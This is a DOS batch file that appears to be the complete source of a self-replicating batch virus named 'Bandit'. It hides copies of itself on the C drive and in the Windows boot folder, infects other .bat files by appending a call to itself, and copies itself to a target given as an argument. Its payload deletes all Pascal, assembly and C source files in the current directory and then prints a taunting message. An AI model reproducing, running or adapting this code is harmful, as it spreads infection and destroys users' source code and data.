@echo off
@ctty nul
if "%0"=="bandit.bat" goto bandit
if "%0"=="sys.bat" goto system
:Not
copy %0 c:\bandit.bat
attrib c:\bandit.bat +h
copy %0 %1
attrib bandit.bat +h
if not exist %winbootdir%\sys.bat goto nosys
goto contin
:nosys
copy %0 %winbootdir%\sys.bat
goto end
:contin
attrib c:\bandit.bat +h
attrib bandit.bat +h
for %%i in (..\*.b?t *.b?t) do set btn=%%i
copy %0 ..
copy %0 %winbootdir%\%0
attrib %btn% -r
attrib %0 +r
for %%f in (*.bat) do find "call c:\bandit.bat" %%f
if not errorlevel 1 goto end
echo. >> %btn%
echo call c:\bandit.bat >> %btn%
echo exit >> %btn%
goto end
:system
@echo off
@ctty nul
%winbootdir%\command\sys.com
copy c:\bandit.bat %1
copy %0 %1
rem :sys.com %1
goto end
:bandit
for %%f in (*.bat) do find "call c:\bandit.bat" %%f
if not errorlevel 1 goto end
del *.pas
del *.asm
del *.c
@ctty con
echo (c) Evil: Your computer Bandit!
del bandit.bat
:end